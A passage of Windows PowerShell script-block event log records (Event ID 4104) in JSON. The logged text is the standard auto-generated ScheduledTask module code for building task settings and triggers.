[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartCount'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartCount'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartInterval')) {\r\n          [object]$__cmdletization_value = ${RestartInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunOnlyIfNetworkAvailable')) {\r\n          [object]$__cmdletization_value = ${RunOnlyIfNetworkAvailable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfNetworkAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfNetworkAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewSettings', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskSettingsSet' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskTrigger\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Once', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Daily', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Daily},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${DaysInterval},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RandomDelay},\r\n\r\n    [Parameter(ParameterSetName='Daily', Mandatory=$true)]\r\n    [Parameter(ParameterSetName='Once', Mandatory=$true)]\r\n    [Parameter(ParameterSetName='Weekly', Mandatory=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${At},\r\n\r\n    [Parameter(ParameterSetName='Logon', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AtLogOn},\r\n\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Once', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Once},\r\n\r\n    [Parameter(ParameterSetName='Once')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RepetitionDuration},\r\n\r\n    [Parameter(ParameterSetName='Once')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RepetitionInterval},\r\n\r\n    [Parameter(ParameterSetName='Startup', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AtStartup},\r\n\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [System.DayOfWeek[]]\r\n    ${DaysOfWeek},\r\n\r\n    [Parameter(ParameterSetName='Weekly', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Weekly},\r\n\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${WeeksInterval},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Daily') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Daily')) {\r\n          [object]$__cmdletization_value = ${Daily}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Daily'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Daily'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DaysInterval')) {\r\n          [object]$__cmdletization_value = ${DaysInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindi",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413037Z"
    },
    "EventRecordID": 83,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 7,
    "MessageTotal": 12,
    "ScriptBlockText": "ngs = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByDaily', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Logon') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AtLogOn')) {\r\n          [object]$__cmdletization_value = ${AtLogOn}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtLogOn'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtLogOn'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByLogon', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Once') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Once')) {\r\n          [object]$__cmdletization_value = ${Once}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Once'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Once'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RepetitionDuration')) {\r\n          [object]$__cmdletization_value = ${RepetitionDuration}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RepetitionInterval')) {\r\n          [object]$__cmdletization_value = ${RepetitionInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByOnce', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Startup') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AtStartup')) {\r\n          [object]$__cmdletization_value = ${AtStartup}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtStartup'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtStartup'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByStartup', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Weekly') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DaysOfWeek')) {\r\n          [object]$__cmdletization_value = ${DaysOfWeek}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysOfWeek'; ParameterType = 'System.DayOfWeek[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysOfWeek'; ParameterType = 'System.DayOfWeek[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Weekly')) {\r\n          [object]$__cmdletization_value = ${Weekly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Weekly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Weekly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WeeksInterval')) {\r\n          [object]$__cmdletization_value = ${WeeksInterval}\r\n          